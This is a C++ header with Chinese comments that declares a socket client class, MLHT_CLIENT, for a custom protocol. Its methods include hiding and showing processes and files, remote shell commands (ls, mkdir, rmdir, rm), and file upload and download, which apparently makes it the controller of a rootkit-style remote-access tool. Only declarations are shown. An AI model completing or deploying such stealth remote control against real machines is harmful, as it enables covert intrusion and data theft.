#include"MLHT.h"
#include<stdio.h>


#define IP_ADDRESS_LENGTH 16
#define SOCKET_BUFFER_SIZE (MLHT_MAX_LENGTH + 1)


//报文接收返回值
#define PACKET_ACCEPT_SUCCESS	0
#define PACKET_ACCEPT_FAIL		1
#define FILE_OPEN_FAIL			2

#define FILE_READ_FAIL			3
#define FILE_WRITE_FAIL			4

#define OP_SUCCESS				5
#define OP_FAIL					6

#define NOT_GET_ACK				7
#define GET_ACK					8

#define FILE_TOO_LARGE			9

#define SOMETHINGWRONG			-2


class MLHT_CLIENT
{
public:

	WSADATA wsaData;
	SOCKET s;
	sockaddr_in sockaddr;
	char server_ip[IP_ADDRESS_LENGTH];	//服务器IP
	int server_port;					//服务器监听端口

	char buffer[MLHT_MAX_LENGTH];

	WORD IDtt;		//发包ID
	
	MLHT *p_send;	//上一个发出的报文
	MLHT *p_get;	//上一个收到的报文

public:
	MLHT_CLIENT(char* ip,int port);	//初始化客户端

	bool ConnectServer();			//连接服务端
	bool CloseSocket();				//断开连接

	int WaitReturnPacket();			//等待返回报文，检测返回报文是否合法
	int WaitForAckPacket();			//等待ACK返回报文

	void SendPacket(WORD mtu_type);	//发无参数报文
	void SendACKPacket();			//发ACK返回报文
	void SendFINPacket();			//发FIN返回报文
	void SendPacket(WORD mtu_type,WORD slicenum,WORD slicesum,char* content,WORD contentlength);//发带参数报文

	bool IsAckPacket();
	bool IsFinPacket();
	bool IsReturnPacket();


	//传输文件包
	int SendFilePacket(
		WORD mtu_type,				//文件操作协议类型
		FILE *fp,					//所传输文件的指针
		int contentlen				//文件长度
		);

	//接收文件包
	int GetFilePacket(
		FILE *fp					//保存目标文件的指针
		);

	//进程操作
	int ShowProcess();
	int HideProcess();

	//文件操作
	int ShowFile();
	int HideFile();

	//Shell操作
	int ShellLs(char* filedir);
	int ShellMkdir(char* filedir);
	int ShellRmdir(char* filedir);
	int ShellRm(char* filename);

	//上传文件
	int UpLoadFile(
		char*srcfiledir, //上传的源文件路径
		char*desfiledir  //上传的目标文件路径
		);

	//下载文件
	int DownLoadFile(
		char*srcfiledir,//下载文件路径
		char*desfiledir //存到的本地目录路径
		);

};